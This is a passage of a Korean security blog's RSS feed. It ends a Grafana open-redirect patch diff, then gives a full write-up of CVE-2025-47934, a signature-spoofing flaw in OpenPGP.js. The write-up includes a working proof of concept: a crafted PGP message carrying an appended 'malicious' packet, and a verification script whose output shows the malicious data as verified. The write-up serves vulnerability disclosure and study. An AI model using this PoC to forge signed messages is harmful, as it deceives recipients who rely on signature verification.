a URL, and not a server relative path</span>                                rePrefix := regexp.MustCompile(<span class="hljs-string">`^(?:/\\|/+)`</span>)-                               path = rePrefix.ReplaceAllString(path, <span class="hljs-string">&quot;/&quot;</span>)+                               redirectPath = rePrefix.ReplaceAllString(redirectPath, <span class="hljs-string">&quot;/&quot;</span>)                        }-                       http.Redirect(ctx.Resp, ctx.Req, path, http.StatusFound)+                       http.Redirect(ctx.Resp, ctx.Req, redirectPath, http.StatusFound)                        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>                }</code></pre><blockquote><p><a href="https://github.com/grafana/grafana/commit/c7a690348df761d41b659224cbc50a46a0c0e4cc">https://github.com/grafana/grafana/commit/c7a690348df761d41b659224cbc50a46a0c0e4cc</a></p></blockquote>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Grafana/">Grafana</category>
      
      <category domain="https://hackyboiz.github.io/tags/Open-Redirect/">Open Redirect</category>
      
      <category domain="https://hackyboiz.github.io/tags/XSS/">XSS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Account-Takeover/">Account Takeover</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/14/empty/CVE-2025-4123/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-47934: OpenPGP.js 서명 스푸핑 취약점</title>
      <link>https://hackyboiz.github.io/2025/06/12/OUYA77/2025-06-12/</link>
      <guid>https://hackyboiz.github.io/2025/06/12/OUYA77/2025-06-12/</guid>
      <pubDate>Thu, 12 Jun 2025 08:20:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://codeanlabs.com/blog/research/cve-2025-47934</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://codeanlabs.com/blog/research/cve-2025-47934-spoofing-openpgp-js-signatures/">https://codeanlabs.com/blog/research/cve-2025-47934-spoofing-openpgp-js-signatures/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OpenPGP.js  &lt; v5.11.3</li><li>OpenPGP.js  &lt; v6.1.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>OpenPGP.js&#xB294; OpenPGP &#xD45C;&#xC900;(RFC 9580)&#xC744; &#xAD6C;&#xD604;&#xD55C; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB85C;, &#xC554;&#xD638;&#xD654;&#xB41C; &#xC774;&#xBA54;&#xC77C;&#xC774;&#xB098; &#xC11C;&#xBA85;&#xB41C; Git &#xCEE4;&#xBC0B; &#xB4F1;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xD45C;&#xC900;&#xC740; &#xBA54;&#xC2DC;&#xC9C0; &#xC554;&#xD638;&#xD654;, &#xC11C;&#xBA85;, &#xD0A4; &#xAD00;&#xB9AC; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. OpenPGP &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xD328;&#xD0B7;&#xC758; &#xC2DC;&#xD000;&#xC2A4;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xBA70;, &#xAC01; &#xD328;&#xD0B7;&#xC740; &#xD45C;&#xC900;&#xC5D0; &#xC815;&#xC758;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xB530;&#xB985;&#xB2C8;&#xB2E4;. OpenPGP.js&#xB294; Mailvelope &#xBC0F; Proton Mail&#xACFC; &#xAC19;&#xC740; &#xC5EC;&#xB7EC; &#xC6F9; &#xAE30;&#xBC18; &#xC774;&#xBA54;&#xC77C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>PGP &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC5EC;&#xB7EC; &#xD328;&#xD0B7;&#xC758; &#xC2DC;&#xD000;&#xC2A4;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xBA70;, &#xAC01; &#xD328;&#xD0B7;&#xC740; &#xBA54;&#xC2DC;&#xC9C0;, &#xC11C;&#xBA85;, &#xC555;&#xCD95; &#xB370;&#xC774;&#xD130; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xAD6C;&#xC870;&#xC801; &#xC720;&#xC5F0;&#xC131; &#xB54C;&#xBB38;&#xC5D0; &#xBA54;&#xC2DC;&#xC9C0; &#xB0B4;&#xBD80;&#xC5D0; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xD328;&#xD0B7;&#xC774; &#xCD94;&#xAC00;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="root-cause-amp-PoC"><a href="#root-cause-amp-PoC" class="headerlink" title="root cause &amp; PoC"></a><strong>root cause &amp; PoC</strong></h3><p>OpenPGP.js&#xC758; &#xD328;&#xD0B7; &#xCC98;&#xB9AC; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC124;&#xACC4; &#xACB0;&#xD568;&#xC73C;&#xB85C; &#xC778;&#xD574;, &#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#x201C;&#xC2E4;&#xC81C;&#xB85C; &#xC11C;&#xBA85;&#xB41C; &#xB370;&#xC774;&#xD130;&#x201D;&#xC640; &#x201C;&#xCD5C;&#xC885; &#xBC18;&#xD658;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#x201D; &#xAC04;&#xC758; &#xBD88;&#xC77C;&#xCE58;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xB0B4;&#xBD80;&#xC758; <strong>&#xBE44;&#xB3D9;&#xAE30; &#xC2A4;&#xD2B8;&#xB9BC; &#xD30C;&#xC2F1; &#xAD6C;&#xC870;&#xC640; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC758; &#xBBF8;&#xD761;&#xD55C; &#xBD84;&#xB9AC; &#xCC98;&#xB9AC;</strong>&#xC5D0; &#xAE30;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> openpgp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;openpgp&apos;</span>);(<span class="hljs-keyword">async</span> () =&gt; {    <span class="hljs-comment">// Generated using:</span>    <span class="hljs-comment">//   cat \</span>    <span class="hljs-comment">//     &lt;(echo &quot;legitimate&quot; | gpg -s -z0) \</span>    <span class="hljs-comment">//     &lt;(printf &quot;\xc8\x12\0\xcb\x0f\x62\0\0\0\0\0malicious&quot;) \</span>    <span class="hljs-comment">//   | base64</span>    <span class="hljs-keyword">let</span> armoredMessage = <span class="hljs-string">`</span><span class="hljs-string">-----BEGIN PGP MESSAGE-----</span><span class="hljs-string"></span><span class="hljs-string">kA0DAAoW1Fu2hl5UcsoByxFiAGhBNptsZWdpdGltYXRlCoh1BAAWCgAdFiEEXSzQbblMQiJ8GaYN</span><span class="hljs-string">1Fu2hl5UcsoFAmhBNpsACgkQ1Fu2hl5UcsqE0QD/bsWYHJrrrK8RM8VgB4Z3K64zWfp49BOi+x0s</span><span class="hljs-string">9VJKyRoBALJdQhGzPwCERCANPR+KdX5ZdrX54ZpY9mriFG6O4hsFyBIAyw9iAAAAAABtYWxpY2lv</span><span class="hljs-string">dXM=</span><span class="hljs-string">-----END PGP MESSAGE-----`</span>;    <span class="hljs-comment">// public key of thomas@codean.io</span>    <span class="hljs-keyword">const</span> publicKeyArmored = <span class="hljs-string">`</span><span class="hljs-string">-----BEGIN PGP PUBLIC KEY BLOCK-----</span><span class="hljs-string"></span><span class="hljs-string">mDMEZSAfBhYJKwYBBAHaRw8BAQdAfdgd2yxL+pYN91ENyp/VZVdWXLjYDONG47jM</span><span class="hljs-string">4dDZDMG0IFRob21hcyBSaW5zbWEgPHRob21hc0Bjb2RlYW4uaW8+iI8EExYIADcW</span><span class="hljs-string">IQRdLNBtuUxCInwZpg3UW7aGXlRyygUCZSAfBgUJBaOagAIbAwQLCQgHBRUICQoL</span><span class="hljs-string">BRYCAwEAAAoJENRbtoZeVHLKpvIBANiaDeLPyaQyHkuzB8T6ZqvfJi4dXNlsqT2F</span><span class="hljs-string">dlUUip4ZAQDSAljghQC9jAQu8I8yMrQJd4SXD1EMH+NLNNYCDEZCC7g4BGUgHwYS</span><span class="hljs-string">CisGAQQBl1UBBQEBB0DOFmUm2nMIda8PzTquulLLy/bFwDtSqAiK1EBqEdvbaAMB</span><span class="hljs-string">CAeIfgQYFggAJhYhBF0s0G25TEIifBmmDdRbtoZeVHLKBQJlIB8GBQkFo5qAAhsM</span><span class="hljs-string">AAoJENRbtoZeVHLKCE8BAJEXE6za1G6pFpaZWKBRMlCbBDSE4rc7iEn5MpC56WtQ</span><span class="hljs-string">AQCnVhRNYBjQ7Bo/VX1rx2+6wx84EXOFmoW80F96QmN0Bw==</span><span class="hljs-string">=Obk+</span><span class="hljs-string">-----END PGP PUBLIC KEY BLOCK-----`</span>;    <span class="hljs-keyword">const</span> publicKey = <span class="hljs-keyword">await</span> openpgp.readKey({ <span class="hljs-attr">armoredKey</span>: publicKeyArmored });    <span class="hljs-keyword">const</span> message = <span class="hljs-keyword">await</span> openpgp.readMessage({ armoredMessage });    <span class="hljs-keyword">const</span> verificationResult = <span class="hljs-keyword">await</span> openpgp.verify({ message, <span class="hljs-attr">verificationKeys</span>: publicKey });    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Signed message data: <span class="hljs-subst">${verificationResult.data}</span>`</span>);    <span class="hljs-keyword">const</span> { verified, keyID } = verificationResult.signatures[<span class="hljs-number">0</span>];    <span class="hljs-keyword">try</span> {        <span class="hljs-keyword">await</span> verified; <span class="hljs-comment">// throws on invalid signature</span>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Verified signature by key id <span class="hljs-subst">${keyID.toHex()}</span>`</span>);    } <span class="hljs-keyword">catch</span> (e) {        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">`Signature could not be verified: <span class="hljs-subst">${e.message}</span>`</span>);    }})();</code></pre><ol><li>&#xC2A4;&#xD2B8;&#xB9BC; &#xD30C;&#xC2F1;&#xC758; &#xBD88;&#xC644;&#xC804;&#xC131;</li></ol><ul><li><code>openpgp.readMessage()</code> &#xD568;&#xC218;&#xB294; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD30C;&#xC2F1;&#xD560; &#xB54C; &#xAC00;&#xC7A5; &#xCCAB; &#xBC88;&#xC9F8; Literal Data &#xD328;&#xD0B7;&#xB9CC; &#xC77D;&#xACE0; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xD6C4;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB098;&#xBA38;&#xC9C0; &#xD328;&#xD0B7;(&#xC608;: &#xC545;&#xC131; &#xB370;&#xC774;&#xD130;)&#xC740; &#xC77D;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xB85C; &#xC2A4;&#xD2B8;&#xB9BC;(&#xBA54;&#xBAA8;&#xB9AC;)&#xC5D0; &#xB0A8;&#xAC8C; &#xB418;&#xBA70;, &#xD6C4;&#xC18D; &#xCC98;&#xB9AC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xB294; &#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC774; &#xC774;&#xD6C4; &#xB370;&#xC774;&#xD130;&#xC758; &#xC874;&#xC7AC; &#xC5EC;&#xBD80;&#xB97C; &#xC778;&#xC9C0;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xBC18;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><ol><li>&#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC758; &#xCDE8;&#xC57D;&#xC810;</li></ol><pre><code class="hljs jsx"><span class="hljs-keyword">async</span> verify(verificationKeys, date = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(), config = defaultConfig) {  <span class="hljs-keyword">const</span> msg = <span class="hljs-built_in">this</span>.unwrapCompressed(); <span class="hljs-comment">// [1]</span>    <span class="hljs-keyword">const</span> literalDataList = msg.packets.filterByTag(enums.packet.literalData);  <span class="hljs-keyword">if</span> (literalDataList.length !== <span class="hljs-number">1</span>) {    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&apos;Can only verify message with one literal data packet.&apos;</span>);  }    <span class="hljs-keyword">if</span> (isArrayStream(msg.packets.stream)) {    msg.packets.push(...await streamReadToEnd(msg.packets.stream, <span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> _ || [])); <span class="hljs-comment">// [2]</span>  }  <span class="hljs-keyword">const</span> onePassSigList = msg.packets.filterByTag(enums.packet.onePassSignature).reverse();  <span class="hljs-keyword">const</span> signatureList = msg.packets.filterByTag(enums.packet.signature);  <span class="hljs-comment">// ...</span></code></pre><ul><li><p><code>openpgp.verify()</code> &#xD638;&#xCD9C; &#xC2DC;, &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>unwrapCompressed()</code> &#xD568;&#xC218;&#xAC00; &#xB3D9;&#xC791;&#xD558;&#xC5EC; &#xC555;&#xCD95;&#xB41C; &#xD328;&#xD0B7;&#xB9CC; &#xCC3E;&#xC544; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;( [ 1 ] ).</p><ul><li><p><code>const msg = this.unwrapCompressed();</code>: &#xC774; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; <code>this.packets</code>&#xC740; &#xC544;&#xC9C1; &#xC644;&#xC804;&#xD558;&#xAC8C; &#xD30C;&#xC2F1;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBBC0;&#xB85C;, <code>unwrapCompressed()</code>&#xB294; <code>Compressed Data</code> &#xD328;&#xD0B7;&#xC744; &#xCC3E;&#xC9C0; &#xBABB;&#xD558;&#xACE0; <code>this</code> (&#xC6D0;&#xBCF8; &#xD328;&#xD0B7; &#xB9AC;&#xC2A4;&#xD2B8;)&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC11C;&#xBA85; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>literalDataList</code>&#xB294; &#x201C;legitimate&#x201D; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; <code>Literal Data</code> &#xD328;&#xD0B7;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p>  <pre><code class="hljs jsx">unwrapCompressed() {   <span class="hljs-keyword">const</span> compressed = <span class="hljs-built_in">this</span>.packets.filterByTag(enums.packet.compressedData);   <span class="hljs-keyword">if</span> (compressed.length) {     <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Message(compressed[<span class="hljs-number">0</span>].packets);   }   <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>; }</code></pre></li></ul></li><li><p>&#xC774;&#xB54C; &#xC555;&#xCD95;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xB098;&#xBA38;&#xC9C0; &#xD328;&#xD0B7;&#xC740; &#xBB34;&#xC2DC;&#xB418;&#xBA70;, &#xAC80;&#xC99D; &#xB300;&#xC0C1;&#xC5D0;&#xC11C; &#xC81C;&#xC678;&#xB429;&#xB2C8;&#xB2E4;.</p></li><li>&#xADF8;&#xB7EC;&#xB098; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xBC18;&#xD658;&#xB418;&#xB294; <code>verificationResult.data</code>&#xC5D0;&#xB294; &#xC774; <strong>&#xAC80;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD328;&#xD0B7;&#xC758; &#xB0B4;&#xC6A9;&#xB3C4; &#xD3EC;&#xD568;</strong>&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;( [ 2 ]).<ul><li><code>msg.packets.push(...await streamReadToEnd(msg.packets.stream, _ =&gt; _ || []));</code> : &#xC774; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC774; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xD6C4;, &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>verificationResult.data</code>&#xC5D0; &#xC2E4;&#xC81C; &#xBA54;&#xC2DC;&#xC9C0; &#xB0B4;&#xC6A9;&#xC744; &#xB2F4;&#xAE30; &#xC704;&#xD574; <code>streamReadToEnd()</code>&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. <code>streamReadToEnd()</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xC2A4;&#xD2B8;&#xB9BC;&#xC5D0; &#xB0A8;&#xC544; &#xC788;&#xB358; &#xBAA8;&#xB4E0; &#xD328;&#xD0B7;(&#xC989;, <code>Signature</code> &#xD328;&#xD0B7;&#xACFC; <code>Compressed Data</code> &#xD328;&#xD0B7;)&#xC774; <code>msg.packets</code> &#xBC30;&#xC5F4;&#xC5D0; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; <code>msg.packets</code>&#xB294; &#xC644;&#xC804;&#xD55C; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC870;&#xC791;&#xB41C; &#xD328;&#xD0B7; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ul></li></ul><ol><li><code>result.data</code> &#xC124;&#xC815; &#xC2DC; <code>unwrapCompressed()</code> &#xC7AC;&#xD638;&#xCD9C; &#xBC0F; &#xC545;&#xC131; &#xB370;&#xC774;&#xD130; &#xBC18;&#xD658;</li></ol><pre><code class="hljs jsx">...<span class="hljs-keyword">if</span> (signature) {  result.signatures = <span class="hljs-keyword">await</span> message.verifyDetached(signature, verificationKeys, date, config);} <span class="hljs-keyword">else</span> {  result.signatures = <span class="hljs-keyword">await</span> message.verify(verificationKeys, date, config);}result.data = format === <span class="hljs-string">&apos;binary&apos;</span> ? message.getLiteralData() : message.getText();...</code></pre><p>&#xC11C;&#xBA85; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC; &#xC790;&#xCCB4;&#xB294; &#x201C;legitimate&#x201D; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD574; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>openpgp.verify()</code>&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; <code>result.data</code>&#xB97C; &#xC124;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD574; <code>message.getLiteralData()</code> (&#xB610;&#xB294; <code>message.getText()</code>)&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xD568;&#xC218; &#xC5ED;&#xC2DC; <code>unwrapCompressed()</code>&#xB97C; &#xB2E4;&#xC2DC; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. <code>streamReadToEnd()</code> &#xD638;&#xCD9C;&#xB85C; &#xC778;&#xD574; <code>msg.packets</code>&#xAC00; &#xC774;&#xC81C; &#xC644;&#xC804;&#xD55C; &#xD328;&#xD0B7; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xBBC0;&#xB85C;, <code>unwrapCompressed()</code>&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC0BD;&#xC785;&#xD55C; &#xCCAB; &#xBC88;&#xC9F8; <code>Compressed Data</code> &#xD328;&#xD0B7;(&#xC545;&#xC131; &#x201C;malicious&#x201D; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294;)&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xBC18;&#xD658;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, OpenPGP.js&#xB294; &#x201C;legitimate&#x201D; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xC11C;&#xBA85;&#xC744; &#xC720;&#xD6A8;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD558;&#xBA74;&#xC11C;&#xB3C4;, &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C;&#xB294; <code>verificationResult.data</code> &#xB610;&#xB294; <code>message.getText()</code>&#xB97C; &#xD1B5;&#xD574; &#x201C;malicious&#x201D; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD45C;&#xC2DC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC720;&#xD6A8;&#xD55C; &#xC11C;&#xBA85;&#xC744; &#xAC00;&#xC9C4; &#xBA54;&#xC2DC;&#xC9C0;&#xC758; &#xB0B4;&#xC6A9;&#xC774; &#xACF5;&#xACA9;&#xC790;&#xC5D0; &#xC758;&#xD574; &#xC784;&#xC758;&#xB85C; &#xC870;&#xC791;&#xB41C; &#xAC83;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xC2A4;&#xD478;&#xD551; &#xACF5;&#xACA9;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC554;&#xD638;&#xD654;&#xB41C; &#xBA54;&#xC2DC;&#xC9C0;&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; <code>openpgp.decrypt()</code>&#xAC00; &#xB3D9;&#xC77C;&#xD55C; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C;, &#xBCF5;&#xD638;&#xD654;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#x201C;malicious&#x201D; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB85C; &#xBC18;&#xD658;&#xB418;&#xC9C0;&#xB9CC;, &#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xACB0;&#xACFC;&#xB294; &#xC6D0;&#xBCF8; &#x201C;legitimate&#x201D; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC5D0; &#xB300;&#xD574; &#xACC4;&#xC0B0;&#xB418;&#xC5B4; &#xC720;&#xD6A8;&#xD558;&#xB2E4;&#xACE0; &#xD45C;&#xC2DC;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">Signed message data: maliciousVerified signature by key id d45bb6865e5472ca:</code></pre><p>&#xACF5;&#xACA9; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xAC04;&#xB2E8;&#xD788; &#xC694;&#xC57D;&#xD558;&#xBA74; &#xC774;&#xB807;&#xAC8C; &#xD45C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xC11C;&#xBA85; &#xBA54;&#xC2DC;&#xC9C0;(&#xC608;: <code>&quot;Transfer $100&quot;</code>&#xC5D0; &#xB300;&#xD55C; &#xC720;&#xD6A8; &#xC11C;&#xBA85;)&#xB97C; &#xD655;&#xBCF4;&#xD55C; &#xB4A4;,</li><li>&#xD574;&#xB2F9; &#xBA54;&#xC2DC;&#xC9C0; &#xB4A4;&#xC5D0; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC545;&#xC758;&#xC801;&#xC778; &#xD328;&#xD0B7;(&#xC608;: <code>&quot;Transfer $10,000&quot;</code>)&#xC744; &#xC0BD;&#xC785;&#xD558;&#xC5EC; <strong>&#xD558;&#xB098;&#xC758; &#xBA54;&#xC2DC;&#xC9C0;&#xB85C; &#xAD6C;&#xC131;</strong>&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xAC80;&#xC99D; &#xACFC;&#xC815;&#xC5D0;&#xC11C;&#xB294; &#xC815;&#xC0C1; &#xC11C;&#xBA85;&#xB41C; &#xBD80;&#xBD84;(<code>&quot;Transfer $100&quot;</code>)&#xB9CC; &#xAC80;&#xC99D;&#xB418;&#xBA70; &#xC11C;&#xBA85;&#xC740; &#x201C;&#xC720;&#xD6A8;&#x201D;&#xB85C; &#xD45C;&#xC2DC;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xADF8;&#xB7EC;&#xB098; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xBC18;&#xD658;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#xB294; <strong>&#xC545;&#xC131; &#xD328;&#xD0B7;&#xAE4C;&#xC9C0; &#xD3EC;&#xD568;&#xD55C; &#xB370;&#xC774;&#xD130;</strong>&#xB85C;&#xC11C;, &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xBCF4;&#xAE30;&#xC5D0;&#xB294; <strong>&#xC815;&#xC0C1; &#xC11C;&#xBA85;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xC624;&#xC778;</strong>&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC989;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD53C;&#xD574;&#xC790;&#xC758; &#xAE30;&#xC874; &#xC11C;&#xBA85;&#xC744; &#xC7AC;&#xC0AC;&#xC6A9;&#xD574; &#xC784;&#xC758;&#xC758; &#xBA54;&#xC2DC;&#xC9C0;&#xB85C; &#xC11C;&#xBA85;&#xC744; &#xC704;&#xC870;(spoof)&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/openpgpjs/openpgpjs/security/advisories/GHSA-8qff-qr5q-5pr8">https://github.com/openpgpjs/openpgpjs/security/advisories/GHSA-8qff-qr5q-5pr8</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/PGP/">PGP</category>
      
      <category domain="https://hackyboiz.github.io/tags/OpenPGP-js/">OpenPGP.js</category>
      
      <category domain="https://hackyboiz.github.io/tags/sign/">sign</category>
      
      <category domain="https://hackyboiz.github.io/tags/spoofing/">spoofing</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-47934/">CVE-2025-47934</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/12/OUYA77/2025-06-12/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
